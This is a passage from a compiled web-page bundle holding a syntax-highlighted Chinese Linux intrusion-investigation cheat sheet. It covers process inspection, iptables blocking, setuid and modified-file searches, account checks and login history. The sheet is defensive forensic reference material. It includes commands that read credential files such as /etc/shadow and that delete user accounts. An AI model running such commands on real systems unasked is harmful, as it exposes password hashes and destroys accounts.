style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\"># 某个pid对应的文件路径</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">ls</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -l</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> /proc/[pid]/exe</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">file</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> /proc/[pid]/exe</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\"># 使用iptables屏蔽ip</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">iptables</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -A</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> INPUT/OUTPUT</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -s/d</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> [目标ip] -j ACCEPT/DROP</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\"># 用iptables封锁和x.com的域名通信</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">iptables</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -I</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> INPUT</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -p</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> tcp</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> --dport</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> 80</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -m</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> string</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> --string</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> \\"x.com\\"</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> --algo</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> bm</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -j</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> DROP</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\"># 进行对比两个进程</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">ps</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -ef</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> | </span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">awk</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> \'{print}\'</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> | </span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">sort</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -n</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> | </span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">uniq</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> &gt;</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">1</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">ls</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> /proc</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> | </span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">sort</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -n</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> | </span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">uniq</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> &gt;</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">2</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">diff</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> 1</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> 2</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\"># 特殊权限文件查找</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">find</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> /</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\"> *</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">.jsp</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -perm</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> 4777</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\"># 被入侵的系统，肯定有文件被改动，通过比较文件的md5，创建时间，文件路径</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">find</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> /</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -uid</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> 0</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -print</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> 查找特权文件</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">find</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> /</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -size</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> +10000k</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -print</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">find</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> /</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -name</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> \\"...\\"</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -print</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">md5sum</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -b</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> [文件名]</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">whereis</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> [文件名]</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\"># 账号检查</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">w</span><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\"> # 查看系统信息</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">cat</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> /etc/passwd</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> 用户信息文件</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">cat</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> /etc/shadow</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> 用户密码</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">less</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> /etc/passwd</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">ls</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -l</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> /etc/passwd</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> 查看文件修改时间</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">usermod</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -L</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> [user] 锁定用户 -U 解锁用户</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">userdel</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> [user] 删除用户</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">userdel</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -r</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> [user] 删除用户和他的home</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\"># 用户登录检查</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">last</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">lastb</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div>","autoDesc":true}')},4932(s,i){i.A=(s,i)=>{const a=s.__vccOpts||s;for(const[s,n]of i)a[s]=n;return a}}}]);